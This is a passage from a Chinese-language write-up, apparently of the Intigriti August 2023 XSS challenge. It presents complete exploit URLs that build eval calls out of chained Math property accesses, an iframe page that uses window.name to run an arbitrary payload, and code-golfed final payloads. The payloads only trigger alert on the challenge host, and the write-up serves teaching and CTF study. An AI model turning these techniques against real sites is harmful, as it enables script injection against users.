class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最後產生的結果為：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>pop<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>pop<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>pop<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>pop<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>pop<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>abs<span class="token punctuation">.</span>name<span class="token punctuation">.</span>at<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>push<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>clz32<span class="token punctuation">.</span>name<span class="token punctuation">.</span>at<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>push<span class="token punctuation">,</span>Math<span class="token punctuation">.</span><span class="token constant">LN2</span><span class="token punctuation">.</span>valueOf<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>exp<span class="token punctuation">.</span>name<span class="token punctuation">.</span>at<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>push<span class="token punctuation">,</span>Math<span class="token punctuation">.</span><span class="token constant">LN2</span><span class="token punctuation">.</span>valueOf<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>round<span class="token punctuation">.</span>name<span class="token punctuation">.</span>at<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>push<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>hypot<span class="token punctuation">.</span>name<span class="token punctuation">.</span>at<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>push<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>clz32<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>cosh<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>log2<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>floor<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>abs<span class="token punctuation">.</span>name<span class="token punctuation">.</span>constructor<span class="token punctuation">.</span>fromCharCode<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>push<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>cosh<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>log<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>cosh<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>floor<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>abs<span class="token punctuation">.</span>name<span class="token punctuation">.</span>constructor<span class="token punctuation">.</span>fromCharCode<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>push<span class="token punctuation">,</span>Math<span class="token punctuation">.</span><span class="token constant">LOG2E</span><span class="token punctuation">.</span>valueOf<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>cos<span class="token punctuation">.</span>name<span class="token punctuation">.</span>at<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>push<span class="token punctuation">,</span>Math<span class="token punctuation">.</span><span class="token constant">LN2</span><span class="token punctuation">.</span>valueOf<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>cos<span class="token punctuation">.</span>name<span class="token punctuation">.</span>at<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>push<span class="token punctuation">,</span>Math<span class="token punctuation">.</span><span class="token constant">E</span><span class="token punctuation">.</span>valueOf<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>imul<span class="token punctuation">.</span>name<span class="token punctuation">.</span>at<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>push<span class="token punctuation">,</span>Math<span class="token punctuation">.</span><span class="token constant">LN2</span><span class="token punctuation">.</span>valueOf<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>max<span class="token punctuation">.</span>name<span class="token punctuation">.</span>at<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>push<span class="token punctuation">,</span>Math<span class="token punctuation">.</span><span class="token constant">LN2</span><span class="token punctuation">.</span>valueOf<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>exp<span class="token punctuation">.</span>name<span class="token punctuation">.</span>at<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>push<span class="token punctuation">,</span>Math<span class="token punctuation">.</span><span class="token constant">E</span><span class="token punctuation">.</span>valueOf<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>min<span class="token punctuation">.</span>name<span class="token punctuation">.</span>at<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>push<span class="token punctuation">,</span>Math<span class="token punctuation">.</span><span class="token constant">LN2</span><span class="token punctuation">.</span>valueOf<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>tan<span class="token punctuation">.</span>name<span class="token punctuation">.</span>at<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>push<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>log2<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>exp<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>ceil<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>abs<span class="token punctuation">.</span>name<span class="token punctuation">.</span>constructor<span class="token punctuation">.</span>fromCharCode<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>push<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>clz32<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>sqrt<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>cosh<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>ceil<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>abs<span class="token punctuation">.</span>name<span class="token punctuation">.</span>constructor<span class="token punctuation">.</span>fromCharCode<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>push<span class="token punctuation">,</span>Math<span class="token punctuation">.</span><span class="token constant">LOG2E</span><span class="token punctuation">.</span>valueOf<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>cos<span class="token punctuation">.</span>name<span class="token punctuation">.</span>at<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>push<span class="token punctuation">,</span>Math<span class="token punctuation">.</span><span class="token constant">LN2</span><span class="token punctuation">.</span>valueOf<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>max<span class="token punctuation">.</span>name<span class="token punctuation">.</span>at<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>push<span class="token punctuation">,</span>Math<span class="token punctuation">.</span><span class="token constant">LN2</span><span class="token punctuation">.</span>valueOf<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>abs<span class="token punctuation">.</span>name<span class="token punctuation">.</span>at<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>push<span class="token punctuation">,</span>Math<span class="token punctuation">.</span><span class="token constant">LN2</span><span class="token punctuation">.</span>valueOf<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>imul<span class="token punctuation">.</span>name<span class="token punctuation">.</span>at<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>push<span class="token punctuation">,</span>Math<span class="token punctuation">.</span><span class="token constant">E</span><span class="token punctuation">.</span>valueOf<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>min<span class="token punctuation">.</span>name<span class="token punctuation">.</span>at<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>push<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>acosh<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>expm1<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>ceil<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>abs<span class="token punctuation">.</span>name<span class="token punctuation">.</span>constructor<span class="token punctuation">.</span>fromCharCode<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>push<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>cos<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>clz32<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>abs<span class="token punctuation">.</span>name<span class="token punctuation">.</span>constructor<span class="token punctuation">.</span>fromCharCode<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>abs<span class="token punctuation">.</span>name<span class="token punctuation">.</span>constructor<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>trim<span class="token punctuation">.</span>call<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>join<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>abs<span class="token punctuation">.</span>constructor<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>abs<span class="token punctuation">.</span>constructor<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>call<span class="token punctuation">.</span>call<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Exploit URL: <a href="https://challenge-0823.intigriti.io/challenge/index.html?q=Math.seeds.pop,Math.seeds.pop,Math.seeds.pop,Math.seeds.pop,Math.seeds.pop,Math.abs.name.at,Math.seeds.push,Math.clz32.name.at,Math.seeds.push,Math.LN2.valueOf,Math.exp.name.at,Math.seeds.push,Math.LN2.valueOf,Math.round.name.at,Math.seeds.push,Math.hypot.name.at,Math.seeds.push,Math.clz32,Math.cosh,Math.log2,Math.floor,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.cosh,Math.log,Math.cosh,Math.floor,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.LOG2E.valueOf,Math.cos.name.at,Math.seeds.push,Math.LN2.valueOf,Math.cos.name.at,Math.seeds.push,Math.E.valueOf,Math.imul.name.at,Math.seeds.push,Math.LN2.valueOf,Math.max.name.at,Math.seeds.push,Math.LN2.valueOf,Math.exp.name.at,Math.seeds.push,Math.E.valueOf,Math.min.name.at,Math.seeds.push,Math.LN2.valueOf,Math.tan.name.at,Math.seeds.push,Math.log2,Math.exp,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.clz32,Math.sqrt,Math.cosh,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.LOG2E.valueOf,Math.cos.name.at,Math.seeds.push,Math.LN2.valueOf,Math.max.name.at,Math.seeds.push,Math.LN2.valueOf,Math.abs.name.at,Math.seeds.push,Math.LN2.valueOf,Math.imul.name.at,Math.seeds.push,Math.E.valueOf,Math.min.name.at,Math.seeds.push,Math.acosh,Math.expm1,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.cos,Math.clz32,Math.abs.name.constructor.fromCharCode,Math.abs.name.constructor.prototype.trim.call,Math.seeds.join,Math.abs.constructor,Math.abs.constructor.prototype.call.call">https://challenge-0823.intigriti.io/challenge/index.html?q=Math.seeds.pop,Math.seeds.pop,Math.seeds.pop,Math.seeds.pop,Math.seeds.pop,Math.abs.name.at,Math.seeds.push,Math.clz32.name.at,Math.seeds.push,Math.LN2.valueOf,Math.exp.name.at,Math.seeds.push,Math.LN2.valueOf,Math.round.name.at,Math.seeds.push,Math.hypot.name.at,Math.seeds.push,Math.clz32,Math.cosh,Math.log2,Math.floor,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.cosh,Math.log,Math.cosh,Math.floor,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.LOG2E.valueOf,Math.cos.name.at,Math.seeds.push,Math.LN2.valueOf,Math.cos.name.at,Math.seeds.push,Math.E.valueOf,Math.imul.name.at,Math.seeds.push,Math.LN2.valueOf,Math.max.name.at,Math.seeds.push,Math.LN2.valueOf,Math.exp.name.at,Math.seeds.push,Math.E.valueOf,Math.min.name.at,Math.seeds.push,Math.LN2.valueOf,Math.tan.name.at,Math.seeds.push,Math.log2,Math.exp,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.clz32,Math.sqrt,Math.cosh,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.LOG2E.valueOf,Math.cos.name.at,Math.seeds.push,Math.LN2.valueOf,Math.max.name.at,Math.seeds.push,Math.LN2.valueOf,Math.abs.name.at,Math.seeds.push,Math.LN2.valueOf,Math.imul.name.at,Math.seeds.push,Math.E.valueOf,Math.min.name.at,Math.seeds.push,Math.acosh,Math.expm1,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.cos,Math.clz32,Math.abs.name.constructor.fromCharCode,Math.abs.name.constructor.prototype.trim.call,Math.seeds.join,Math.abs.constructor,Math.abs.constructor.prototype.call.call</a></p><h2><span id="arbitrary-xss">Arbitrary XSS</span></h2><p>上面的程式碼只是執行靜態的 <code>alert(document.domain)</code> 指令，那有可能執行任意的 JavaScript 程式碼嗎？</p><p>只要找到一個夠短的 payload，看起來就沒什麼問題。</p><p>例如說 <code>eval(location.hash.slice(1))</code> 雖然很短但還是有點長，如果用上面我提供的 script 去跑會卡住一下（因為我程式碼有些 bug），最後產生出一個長度 120 的結果，超過了 100。</p><p>但是另一個 payload <code>eval(&quot;&#39;&quot;+location)</code> 倒是沒問題，長度是 85：</p><p><a href="https://challenge-0823.intigriti.io/challenge/index.html?q=Math.seeds.pop,Math.seeds.pop,Math.seeds.pop,Math.seeds.pop,Math.seeds.pop,Math.exp.name.at,Math.seeds.push,Math.tan,Math.sinh,Math.sinh,Math.expm1,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.atan.name.at,Math.seeds.push,Math.ceil.name.at,Math.seeds.push,Math.clz32,Math.cosh,Math.log2,Math.floor,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.cosh,Math.cbrt,Math.cosh,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.exp,Math.tan,Math.expm1,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.expm1,Math.sqrt,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.cbrt,Math.cosh,Math.expm1,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.LN2.valueOf,Math.log.name.at,Math.seeds.push,Math.LOG2E.valueOf,Math.cos.name.at,Math.seeds.push,Math.LN2.valueOf,Math.cos.name.at,Math.seeds.push,Math.LN2.valueOf,Math.abs.name.at,Math.seeds.push,Math.LN2.valueOf,Math.tan.name.at,Math.seeds.push,Math.LN2.valueOf,Math.imul.name.at,Math.seeds.push,Math.LOG2E.valueOf,Math.cos.name.at,Math.seeds.push,Math.E.valueOf,Math.min.name.at,Math.seeds.push,Math.atan,Math.sinh,Math.cosh,Math.cosh,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.cos,Math.clz32,Math.abs.name.constructor.fromCharCode,Math.abs.name.constructor.prototype.trim.call,Math.seeds.join,Math.abs.constructor,Math.abs.constructor.prototype.call.call#';alert(document.domain+'/arb-xss')">https://challenge-0823.intigriti.io/challenge/index.html?q=Math.seeds.pop,Math.seeds.pop,Math.seeds.pop,Math.seeds.pop,Math.seeds.pop,Math.exp.name.at,Math.seeds.push,Math.tan,Math.sinh,Math.sinh,Math.expm1,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.atan.name.at,Math.seeds.push,Math.ceil.name.at,Math.seeds.push,Math.clz32,Math.cosh,Math.log2,Math.floor,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.cosh,Math.cbrt,Math.cosh,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.exp,Math.tan,Math.expm1,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.expm1,Math.sqrt,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.cbrt,Math.cosh,Math.expm1,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.LN2.valueOf,Math.log.name.at,Math.seeds.push,Math.LOG2E.valueOf,Math.cos.name.at,Math.seeds.push,Math.LN2.valueOf,Math.cos.name.at,Math.seeds.push,Math.LN2.valueOf,Math.abs.name.at,Math.seeds.push,Math.LN2.valueOf,Math.tan.name.at,Math.seeds.push,Math.LN2.valueOf,Math.imul.name.at,Math.seeds.push,Math.LOG2E.valueOf,Math.cos.name.at,Math.seeds.push,Math.E.valueOf,Math.min.name.at,Math.seeds.push,Math.atan,Math.sinh,Math.cosh,Math.cosh,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.cos,Math.clz32,Math.abs.name.constructor.fromCharCode,Math.abs.name.constructor.prototype.trim.call,Math.seeds.join,Math.abs.constructor,Math.abs.constructor.prototype.call.call#&#39;;alert(document.domain+&#39;/arb-xss&#39;)</a></p><p>能夠達成執行任意程式碼以後，下一步就是盡可能找出最短的 operations。</p><h2><span id="code-golf-時間">Code golf 時間</span></h2><h3><span id="最短的-xss-payload">最短的 XSS payload</span></h3><p>雖然說剛剛的 <code>eval(&quot;&#39;&quot;+location)</code> 已經很短了，但以這題來說，還有一個更短的 payload。</p><p>我從 @DrBrix 學到了可以用 <code>eval(parent.name)</code> 來縮短長度，而且這個技巧聰明地利用了 iframe。</p><p>在原本題目裡面有特別設置了 name，就是為了確保 name 不要被覆蓋，而  <code>https://challenge-0823.intigriti.io/</code> 這個頁面用 iframe 嵌入了 <code>chanllenge/index.html</code>，所以用 <code>parnent.name</code> 就可以存取到 <code>https://challenge-0823.intigriti.io/</code> 這個頁面的 name。</p><p>因此，@DrBrix 的策略是這樣的，首先我們有一個自己的頁面，就叫做 exp.html 好了，在 exp.html 裡面新增一個 iframe，先把 name 設成 payload，再把 location 替換成 <code>https://challenge-0823.intigriti.io</code>，如此一來結構就變成了：</p><pre class="line-numbers language-none"><code class="language-none">- exp.html (top)--- https:&#x2F;&#x2F;challenge-0823.intigriti.io (name: &#39;alert(1)&#39;)------ https:&#x2F;&#x2F;challenge-0823.intigriti.io&#x2F;challenge&#x2F;index.html<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>接著就可以用 <code>frames[0].frames[0]</code> 存取到最底下的 iframe，並且把它跳轉到我們準備好的網址，變成這樣：</p><pre class="line-numbers language-none"><code class="language-none">- exp.html (top)--- https:&#x2F;&#x2F;challenge-0823.intigriti.io (name: &#39;alert(1)&#39;)------ https:&#x2F;&#x2F;challenge-0823.intigriti.io&#x2F;challenge&#x2F;index.html?q&#x3D;...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>如此一來，就可以用 <code>parent.name</code> 存取到我們調整過的 name，程式碼如下：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>frames<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>frames<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>location<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">'https://challenge-0823.intigriti.io/challenge/index.html?q=Math.random'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token number">3000</span><span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">srcdoc</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>&lt;script>name = "alert(document.domain)"document.location = "https://challenge-0823.intigriti.io/"&lt;/script><span class="token punctuation">'</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>eval(parent.name)</code> 是我能找到最短的 payload，第二短的是 <code>location=parent.name</code></p><h3><span id="清空-mathseeds">清空 Math.seeds</span></h3><p>之前是用 <code>Math.seeds.pop()</code> 來把內容清空，但其實這部分也可以再縮短！</p><p>@y0d3n 用了一個技巧是： <code>Math.seeds.splice(Math.imul())</code></p><p>這是因為 <code>Math.imul()</code> 的回傳值是 0，而 <code>splice(0)</code> 的意思是：「刪除第 0 個元素以後的資料」，所以整個陣列都被清空了。</p><h3><span id="得到空字串">得到空字串</span></h3><p>之前我自己是用了比較迂迴的方式產生空字串，但後來才發現其實用 <code>Math.random.name</code> 就可以得到空字串了。</p><p>之所以可以是因為這一段：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">Math<span class="token punctuation">.</span><span class="token function-variable function">random</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span>seeds<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>seeds <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0.62536</span><span class="token punctuation">,</span> <span class="token number">0.458483</span><span class="token punctuation">,</span> <span class="token number">0.544523</span><span class="token punctuation">,</span> <span class="token number">0.323421</span><span class="token punctuation">,</span> <span class="token number">0.775465</span><span class="token punctuation">]</span>    next <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>seeds<span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token keyword">this</span><span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>length<span class="token punctuation">]</span>  <span class="token punctuation">&#125;</span>  next <span class="token operator">=</span> next <span class="token operator">*</span> <span class="token number">1103515245</span> <span class="token operator">+</span> <span class="token number">12345</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>next <span class="token operator">/</span> <span class="token number">65536</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">32767</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意這邊 <code>function</code> 後面沒有一個名稱，因此這個函式其實是匿名函式，所以我們是把一個匿名函式 assign 給 <code>Math.random</code>，因此 <code>Math.random.name</code> 就會是個空字串。</p><h3><span id="得到固定的數字">得到固定的數字</span></h3><p>之前我是用 <code>Math.PI</code> 這種內建的常數來得到固定的數字，而我後來從 @Astrid 那邊發現了還可以用 <code>STRING.length.valueOf()</code> 這種形式來拿到數字。</p><p>舉例來說，<code>Math.isPrototypeOf.name.length.valueOf()</code> 就會是 13，利用這種方式可以更快地拿到一個固定的數字。</p><p>拿到固定數字以後，就可以以更短的步驟去找到我們想要的數字，而 @Astrid 甚至還寫了一段程式碼把最短路徑找出來。</p><h3><span id="final-solution">Final solution</span></h3><p>最後產生出來的 payload 一共 59 個操作，會執行 <code>eval(parent.name)</code>，需要搭配前面講過的 iframe 才能執行：</p><pre class="line-numbers language-none"><code class="language-none">Math.imul,Math.seeds.splice,Math.exp.name.at,Math.seeds.push,Math.LN2.valueOf,Math.abs.name.constructor.prototype.valueOf.name.at,Math.seeds.push,Math.atan.name.at,Math.seeds.push,Math.ceil.name.at,Math.seeds.push,Math.isPrototypeOf.name.length.valueOf,Math.log2,Math.exp,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.LN2.valueOf,Math.pow.name.at,Math.seeds.push,Math.abs.name.constructor.fromCharCode.name.at,Math.seeds.push,Math.abs.name.constructor.fromCharCode.name.at,Math.seeds.push,Math.abs.name.constructor.prototype.normalize.name.at,Math.seeds.push,Math.LN2.valueOf,Math.abs.name.constructor.prototype.normalize.name.at,Math.seeds.push,Math.abs.name.constructor.prototype.codePointAt.name.at,Math.seeds.push,Math.PI.valueOf,Math.exp,Math.acosh,Math.exp,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.LN2.valueOf,Math.abs.name.constructor.prototype.normalize.name.at,Math.seeds.push,Math.LN2.valueOf,Math.abs.name.at,Math.seeds.push,Math.LN2.valueOf,Math.max.name.at,Math.seeds.push,Math.LN2.valueOf,Math.exp.name.at,Math.seeds.push,Math.asinh,Math.log2,Math.tan,Math.cosh,Math.floor,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.random.name.valueOf,Math.seeds.join,Math.abs.constructor,Math.abs.constructor.prototype.call.call<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>產生的腳本如下：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">findTargetFromScope</span><span class="token punctuation">(</span>scope<span class="token punctuation">,</span> matchFn<span class="token punctuation">,</span> initPath<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">let</span> visited <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token keyword">let</span> result <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token function">findTarget</span><span class="token punctuation">(</span>scope<span class="token punctuation">,</span> initPath<span class="token punctuation">)</span>  <span class="token comment">// return the shortest one</span>  <span class="token keyword">return</span> result<span class="token punctuation">.</span><span class="token function">sort</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span> b</span><span class="token punctuation">)</span> <span class="token operator">=></span> a<span class="token punctuation">.</span>length <span class="token operator">-</span> b<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>  <span class="token keyword">function</span> <span class="token function">findTarget</span><span class="token punctuation">(</span><span class="token parameter">obj<span class="token punctuation">,</span> path</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>visited<span class="token punctuation">.</span><span class="token function">has</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span>    visited<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span>    <span class="token keyword">const</span> list <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">getOwnPropertyNames</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> key <span class="token keyword">of</span> list<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">const</span> item <span class="token operator">=</span> obj<span class="token punctuation">[</span>key<span class="token punctuation">]</span>      <span class="token keyword">const</span> newPath <span class="token operator">=</span> path <span class="token operator">?</span> path <span class="token operator">+</span> <span class="token string">"."</span> <span class="token operator">+</span> key <span class="token operator">:</span> key      <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">matchFn</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          result<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>newPath<span class="token punctuation">)</span>          <span class="token keyword">continue</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>item <span class="token operator">&amp;&amp;</span> <span class="token keyword">typeof</span> item <span class="token operator">===</span> <span class="token string">'object'</span><span class="token punctuation">)</span> <span class="token 